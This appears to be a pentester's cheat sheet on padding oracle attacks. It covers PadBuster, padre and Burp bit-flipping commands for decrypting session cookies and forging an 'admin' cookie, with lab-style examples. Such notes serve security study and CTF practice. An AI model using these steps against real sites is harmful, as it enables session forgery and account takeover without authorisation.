# Padding Oracle

Might exist when we **register/login** and there is a **cookie session** like **auth**.

{% code overflow="wrap" fullWidth="true" %}
```bash
# Padbuster
https://github.com/AonCyberLabs/PadBuster
https://tools.kali.org/web-applications/padbuster
# CBC cipher --> IV, key, plaintext
# BYTES_NUMBER is 8 for these cases, -encoding is 0 because the cookie is base64 encoded, if not check other enconding on help
padbuster $URL $COOKIE_VALUE $BYTES_NUMBER -cookie "$COOKIE_NAME=$COOKIE_VALUE" -encoding 0 
# We should obtain a table and some asterisk on a ID, that means the error was triggered there
# Then we input that ID number and after decrypting the cookie, we will see the decrypted value (ASCII) and if is user=$INPUT_USER, that means we can hijack that cookie impersonating the user admin
padbuster $URL $COOKIE_VALUE $BYTES_NUMBER -cookie "$COOKIE_NAME=$COOKIE_VALUE" -encoding 0 -plaintext "user=admin"
# After this, we have to select the ID with ** again and we will get that cookie
# When we get the encrypted value, we log in as a normal user, use Cookie Editor extension, paste the encrypted cookie we got with user=admin, acept, refresh and we are admin!!!

# SOMETIMES THIS WORKS WITH CBC CIPHER
Register --> user+"=" (user=) --> log in

# TIP: When Padding Oracle attack exists, we can logout on the webserver, register a username as "admin=" with no other input and we will be admin, if that userexists we can try admin== and so on

# Get cookie structure
padbuster http://10.10.119.56/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies "hcon=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka" -error "Invalid padding"
# Get cookie for other user (impersonation)
padbuster http://10.10.119.56/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies "hcon=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka" -error "Invalid padding" -plaintext 'user=administratorhc0nwithyhackme'

# https://github.com/glebarez/padre
padre -u 'https://target.site/profile.php' -cookie 'SESS=$' 'Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg=='

# https://github.com/Kibouo/rustpad


# ALTERNATIVE: BITFLIPPER ATTACK W/ BURP
- We sign up as a user similar to our target (admin -> bdmin)
- Intercept the login request with the cookie
- Send it to Intruder > Set payload as the cookie value > Payload Sets > Payload type: Bit flipper 
- Payload Options > Format of original data: Literal value
- Disable last option (URL-encode these characters)
- Grep-extract to fetch a response where it says we are registered as X user
```
{% endcode %}
